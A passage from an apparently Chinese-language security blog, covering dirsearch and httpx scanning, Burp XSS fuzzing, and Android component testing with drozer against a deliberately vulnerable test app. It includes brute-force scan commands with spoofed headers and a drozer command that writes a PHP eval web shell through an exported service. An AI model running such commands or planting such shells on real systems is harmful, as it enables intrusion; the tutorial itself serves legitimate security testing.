class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ <span class="subst">&#123;idx:2d&#125;</span>. 无效地址：<span class="subst">&#123;target:35s&#125;</span>（非域名/IP，已过滤）&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 保存格式化结果</span></span><br><span class="line">    <span class="keyword">if</span> valid_formatted:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&quot;\n&quot;</span>.join(valid_formatted))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;处理完成！统计如下：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📊 原始目标总数：<span class="subst">&#123;<span class="built_in">len</span>(raw_targets)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 有效格式化目标数：<span class="subst">&#123;<span class="built_in">len</span>(valid_formatted)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 无效地址数（已过滤）：<span class="subst">&#123;<span class="built_in">len</span>(invalid_list)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📁 结果保存路径：<span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;💡 使用方式：python dirsearch.py -l <span class="subst">&#123;output_file&#125;</span> [其他参数]&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 处理完成，但未检测到任何有效目标（所有输入均为非地址字符）&quot;</span>)</span><br><span class="line">        <span class="comment"># 避免生成空文件</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(output_file):</span><br><span class="line">            os.remove(output_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="comment"># 命令行参数解析</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;dirsearch目标URL处理工具：先校验合法性，再标准化格式化&quot;</span>)</span><br><span class="line">    group = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">    group.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;输入目标文件路径（每行1个目标，支持#注释和空行）&quot;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--urls&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;直接输入目标列表（用逗号分隔，如\&quot;target.com,192.168.1.1:8080\&quot;）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, default=<span class="string">&quot;formatted_targets.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;结果保存文件（默认：formatted_targets.txt）&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行处理逻辑</span></span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        process_targets(input_source=args.file, is_file=<span class="literal">True</span>, output_file=args.output)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        process_targets(input_source=args.urls, is_file=<span class="literal">False</span>, output_file=args.output)</span><br></pre></td></tr></table></figure>

 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python url_formatter.py -f raw_targets.txt -o valid_targets.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="爆破单个目标"><a href="#爆破单个目标" class="headerlink" title="爆破单个目标"></a>爆破单个目标</h3><ol>
<li><p>最佳语法</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -e php,html,js,txt -t 15 --delay 0.5 --random-agent --exclude-status 404,403,500-599 --exclude-sizes 0B,1KB-2KB --cookie &quot;PHPSESSID=random_value; X-Requested-With=XMLHttpRequest&quot; -w /usr/share/wordlists/dirb/common.txt --format json -o target_scan_result.json -u http://target.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>提取路径</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;target_scan_result.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"><span class="comment"># 提取状态码200的有效路径</span></span><br><span class="line">valid_paths = [entry[<span class="string">&quot;path&quot;</span>] <span class="keyword">for</span> entry <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>] <span class="keyword">if</span> entry[<span class="string">&quot;status&quot;</span>] == <span class="number">200</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;有效路径：&quot;</span>, valid_paths)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="多目标路径爆破"><a href="#多目标路径爆破" class="headerlink" title="多目标路径爆破"></a>多目标路径爆破</h3><ol>
<li><p>最佳实践</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -e php,html,js,txt,asp -t 10 --delay 1 --random-agent -H &quot;X-Forwarded-For: 8.8.8.8&quot; --exclude-status 404,403,500-599 --exclude-sizes 0B,1KB-3KB --max-time 300 --session multi_target_scan.session -w /usr/share/wordlists/dirb/common.txt --format json -o multi_target_results.json -l /path/to/target_urls.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>路径提取</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">result_dir = <span class="string">&quot;multi_target_results&quot;</span></span><br><span class="line">valid_paths = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有目标的JSON结果文件</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(result_dir):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.json&quot;</span>):</span><br><span class="line">        target = filename.replace(<span class="string">&quot;.json&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(result_dir, filename), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = json.load(f)</span><br><span class="line">        <span class="comment"># 提取状态码200、响应大小&gt;3KB的路径</span></span><br><span class="line">        <span class="keyword">for</span> entry <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> entry[<span class="string">&quot;status&quot;</span>] == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">int</span>(entry[<span class="string">&quot;size&quot;</span>].replace(<span class="string">&quot;KB&quot;</span>, <span class="string">&quot;&quot;</span>)) &gt; <span class="number">3</span>:</span><br><span class="line">                valid_paths.append(&#123;<span class="string">&quot;target&quot;</span>: target, <span class="string">&quot;path&quot;</span>: entry[<span class="string">&quot;path&quot;</span>], <span class="string">&quot;size&quot;</span>: entry[<span class="string">&quot;size&quot;</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出整理后的有效路径</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> valid_paths:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;目标：<span class="subst">&#123;item[<span class="string">&#x27;target&#x27;</span>]&#125;</span> | 有效路径：<span class="subst">&#123;item[<span class="string">&#x27;path&#x27;</span>]&#125;</span> | 大小：<span class="subst">&#123;item[<span class="string">&#x27;size&#x27;</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="httpx"><a href="#httpx" class="headerlink" title="httpx"></a>httpx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">httpx功能很多，我们只需要批量探测存活的目标即可（批量访问，然获取StatusCode、Title、ip等核心字段，人工判断存活即可）</span></span><br><span class="line">httpx -sc -cl -title -ip -t 120 -fr -csv -o &quot;httpx-hosts.csv&quot; -l &quot;hosts.txt&quot;</span><br><span class="line"></span><br><span class="line">	-sc: Status Code</span><br><span class="line">	-cl: Content Length</span><br><span class="line">	-title: Page Title</span><br><span class="line">	-ip: A/AAAA/CNAME</span><br><span class="line">	-t: threads</span><br><span class="line">	-fr: follow redirect</span><br><span class="line">	-csv -o: save xxx.csv</span><br><span class="line">	-l: a list of hosts</span><br></pre></td></tr></table></figure>

<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><h3 id="xssValidator"><a href="#xssValidator" class="headerlink" title="xssValidator"></a>xssValidator</h3><ol>
<li><p>BurpStore下载xssValidator插件</p>
</li>
<li><p>Intruder设置payload</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211149773.png" alt="image-20251116211149773"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211301073.png" alt="image-20251116211301073"></p>
</li>
<li><p>在Intruder的Setting模块中，添加对结果进行关键字匹配（最好具有标志性，不要和正常代码混淆了）</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211447510.png" alt="image-20251116211447510"></p>
</li>
<li><p>在xssValidator插件中设置同样的关键字</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211535215.png" alt="image-20251116211535215"></p>
</li>
<li><p>开始爆破</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211758912.png" alt="image-20251116211758912"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>武器库</tag>
      </tags>
  </entry>
  <entry>
    <title>APK安全测试</title>
    <url>/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<blockquote>
<p>Reference：</p>
<ol>
<li><a href="https://blog.csdn.net/qq_40037555/article/details/151819602">【APK安全】APK应用安全测试策略-CSDN博客</a></li>
<li><a href="https://xz.aliyun.com/news/11538">Android APP-四大组件安全测试-先知社区</a></li>
<li><a href="https://www.jianshu.com/p/826439b24467">https://www.jianshu.com/p/826439b24467</a></li>
<li><a href="https://www.cnblogs.com/hetianlab/p/19048752">Android四大组件安全漏洞实战 - 蚁景网安实验室 - 博客园</a></li>
</ol>
</blockquote>
<h2 id="How-to-sniff-packet"><a href="#How-to-sniff-packet" class="headerlink" title="How to sniff packet?"></a>How to sniff packet?</h2><ol>
<li><p>There is just a detection for client to check system cert.</p>
<ul>
<li><p>Import ca-cert from burp: burp.der</p>
</li>
<li><p>Transform .der to .pem through openssl</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform DER -in burp.der -out burp.pem</span><br><span class="line">openssl x509 -subject_hash_old -in burp.pem（maybe the result is &quot;9a5ba575&quot;）</span><br><span class="line">mv burp.pem 9a5ba575.0</span><br><span class="line">adb root</span><br><span class="line">adb push 9a5ba575.0 /sdcard/download</span><br><span class="line">adb shell mv /sdcard/Downlaod/9a5ba575.0 /system/etc/security/cacerts/</span><br><span class="line">adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0</span><br><span class="line">adb shell chown root:root /system/etc/security/cacerts/9a5ba575.0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>If there are built-in certificates within the client：reverse the app and hook the cert.</p>
</li>
<li><p>If the directory is read-only, remount the disk.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新挂载系统分区为可读写模式</span></span><br><span class="line">mount -o rw,remount /system</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者尝试这个命令（根据设备不同）</span></span><br><span class="line">mount -o remount,rw /</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新挂载为只读模式以保护系统</span></span><br><span class="line">mount -o ro,remount /system</span><br><span class="line"></span><br><span class="line">注意事项：</span><br><span class="line">需要 Root 权限：这些操作需要设备已经获取 root 权限</span><br><span class="line">确认设备已 root：先执行 su 命令获取 root 权限</span><br><span class="line">不同设备可能略有差异：有些车机可能使用 /system_root 或其他挂载点</span><br></pre></td></tr></table></figure>
</li>
<li><p>Forward traffic</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 通过 ADB 进入设备</span></span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 使用 iptables 强制重定向所有 HTTP/HTTPS 流量</span></span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 172.20.10.6:8080</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 172.20.10.6:8080</span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 验证规则</span></span><br><span class="line">iptables -t nat -L -n</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除规则（完成后执行）</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line">注意：BurpSuite应该在代理设置模块，选择合适的网卡进行监听（默认为127.0.0.1）</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="反Frida调试"><a href="#反Frida调试" class="headerlink" title="反Frida调试"></a>反Frida调试</h2><h3 id="修改启动端口"><a href="#修改启动端口" class="headerlink" title="修改启动端口"></a>修改启动端口</h3><p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173121566.png" alt="image-20251015173121566"></p>
<p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173149587.png" alt="image-20251015173149587"></p>
<h2 id="Four-Major-Components"><a href="#Four-Major-Components" class="headerlink" title="Four Major Components"></a>Four Major Components</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><table>
<thead>
<tr>
<th align="center">Attack Surface</th>
<th align="center">Harm</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Unauthorized Access</td>
<td align="center">例如：绕过登陆界面，直接调用、访问后面的activity界面</td>
</tr>
<tr>
<td align="center">DoS</td>
<td align="center">通过Intent给Activity传输畸形数据，导致程序崩溃</td>
</tr>
<tr>
<td align="center">Implicit Itent Hajacking</td>
<td align="center">放在一个一样的界面，收集用户的账号密码</td>
</tr>
</tbody></table>
<h4 id="Unauthorized-Access"><a href="#Unauthorized-Access" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Deploy environment</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 测试APP：https://github.com/as0ler/Android-Examples</span><br><span class="line">2. 测试工具：https://github.com/ReversecLabs/drozer; https://github.com/ReversecLabs/drozer-agent</span><br></pre></td></tr></table></figure>
</li>
<li><p>Start the test app(testapp) and get it’s package name with “App messenger” or other ways</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105330948.png" alt="image-20250922105330948"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131340290.png" alt="image-20250922131340290"></p>
</li>
<li><p>Connect the device and enter drozer’s console.</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131448232.png" alt="image-20250922131448232"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105753249.png" alt="image-20250922105753249"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105838954.png" alt="image-20250922105838954"></p>
</li>
<li><p>Fint attacksufaces of the app.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface YourPacakgeName</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922110258485.png" alt="image-20250922110258485"></p>
</li>
<li><p>Verify exported activities</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.activity.info -a YourPackageName</span><br></pre></td></tr></table></figure>

<p> <img src="C:\Users\RedTeamer\AppData\Roaming\Typora\typora-user-images\image-20250922110649496.png" alt="image-20250922110649496"></p>
</li>
<li><p>Start other activity to bypass MainActivity</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.activity.start --component YourPackageName YourPackageName.ActivityName</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922111040903.png" alt="image-20250922111040903"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131826719.png" alt="image-20250922131826719"></p>
</li>
</ol>
<h4 id="Implicit-Itent-Hijacking"><a href="#Implicit-Itent-Hijacking" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 参考文章：https://blog.csdn.net/qq_40037555/article/details/151955581</span><br><span class="line">2. 隐式 Intent 通过 action、category、data 等属性来匹配目标 Activity，而非直接指定具体类名。这意味着任何应用只要在 Manifest 中声明了匹配这些属性的 Activity，都可能被系统选中并启动。</span><br><span class="line">3. 攻击者可以创建恶意应用，在其 Manifest 中注册与目标应用相同的 Intent Filter（包含相同的 action、category 等）。当系统解析隐式 Intent 时，恶意 Activity 可能被优先匹配并启动。</span><br><span class="line">4. 建议尽量使用显式 Intent 启动内部 Activity，对必须使用的隐式 Intent，应通过设置包名（setPackage ()）或使用签名验证等方式限制接收者。</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Test method of verify the vulnerability is same to “PriEsc and bypass”</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151617879.png" alt="image-20250922151617879"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151734047.png" alt="image-20250922151734047"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151829137.png" alt="image-20250922151829137"></p>
</li>
<li><p>But there are some differences in exploit the vulnerability. Attackers usually need to prepare the same page for fishing and an application for monitoring target activities to call the fishing page automatically.</p>
</li>
</ol>
<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><table>
<thead>
<tr>
<th align="center">Attack Surface</th>
<th align="center">Harm</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Unauthorized Access</td>
<td align="center">Call the service to excute some dangerous functions with null privilege.</td>
</tr>
<tr>
<td align="center">Implicit Itent Hijacking</td>
<td align="center">Get some received sensitive datas or return some vicious datas to other functions.</td>
</tr>
</tbody></table>
<h4 id="Unauthorized-Access-1"><a href="#Unauthorized-Access-1" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Find out the attack surfaces about service with drozer(test app: com.asec.alan)</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface com.asec.alan</span><br><span class="line">run app.service.info -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140010685.png" alt="image-20250923140010685"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140203300.png" alt="image-20250923140203300"></p>
</li>
<li><p>Confirm how the service is invoked by revesing the apk.</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableService&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_WRITE_FILE&quot;</span>.equals(action)) &#123;</span><br><span class="line">                writeToFile(intent.getStringExtra(<span class="string">&quot;file_path&quot;</span>), intent.getStringExtra(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_GET_SECRET&quot;</span>.equals(action)) &#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;敏感信息: &quot;</span> + getSensitiveInformation());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, i, i2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeToFile</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(str));</span><br><span class="line">            fileWriter.write(str2);</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;写入文件错误&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getSensitiveInformation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;数据库密码: dbpass123; API密钥: secretkey456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">&quot;com.asec.alan.VulnerableService&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>We can draw a conclusion that this service is invoked by starting rather than binding. So, we could start the service with drozer.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named writeToFile by the action whitch value is com.asec.alan.ACTION_WRITE_FILE</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_WRITE_FILE --extra string file_path &quot;/data/data/com.asec.alan/backdoor.php&quot; --extra string content &quot;&lt;?php @eval($_POST[&#x27;TscanPlus&#x27;]); ?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142017901.png" alt="image-20250923142017901"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142047595.png" alt="image-20250923142047595"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monitor the <span class="built_in">log</span> by adb</span></span><br><span class="line">adb logcat VulnerableService:D *:S</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named getSensitiveInformation by the action <span class="built_in">which</span> value is com.asec.alan.ACTION_GET_SECRET</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_GET_SECRET</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142723441.png" alt="image-20250923142723441"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142647122.png" alt="image-20250923142647122"></p>
</li>
</ol>
<h4 id="Implicit-Itent-Hijacking-1"><a href="#Implicit-Itent-Hijacking-1" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 隐式 Intent 通过 action、category、data 等属性匹配 Service，而非直接指定具体类名。这使得任何应用只要在 Manifest 中注册了匹配这些属性的 Service，都可能被系统选中并启动。攻击者可通过伪装相同的 Intent Filter，让系统优先启动恶意 Service。</span><br><span class="line">2. Service 通常在后台运行，用户无法直接感知其启动和运行状态。即使恶意 Service 被启动，用户也难以察觉，导致恶意代码可长期在后台执行敏感操作（如监听数据、篡改通信等）。</span><br><span class="line">3. 为 Service 设置自定义权限（android:permission），并校验调用者的签名或权限;对必须使用的隐式 Intent，通过setPackage()限制目标应用包名。</span><br></pre></td></tr></table></figure>

<h3 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h3><h4 id="Unauthorized-Access-2"><a href="#Unauthorized-Access-2" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Determine the information of broadcast</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.broadcast.info -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924105533337.png" alt="image-20250924105533337"></p>
</li>
<li><p>Obtain the source code through decompilation</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_SENSITIVE_OPERATION&quot;</span>.equals(intent.getAction())) &#123;</span><br><span class="line">            performSensitiveOperation(context, intent.getStringExtra(<span class="string">&quot;operation&quot;</span>), intent.getStringExtra(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">performSensitiveOperation</span><span class="params">(Context context, String str, String str2)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;执行了操作: &quot;</span> + str + <span class="string">&quot;，数据: &quot;</span> + str2, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Send counterfeit messages to the broadcast</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --component com.asec.alan com.asec.alan.VulnerableReceiver --action com.asec.alan.ACTION_SENSITIVE_OPERATION --extra string operation &quot;viciousData1&quot; --extra string data &quot;viciousData2&quot;</span><br></pre></td></tr></table></figure>
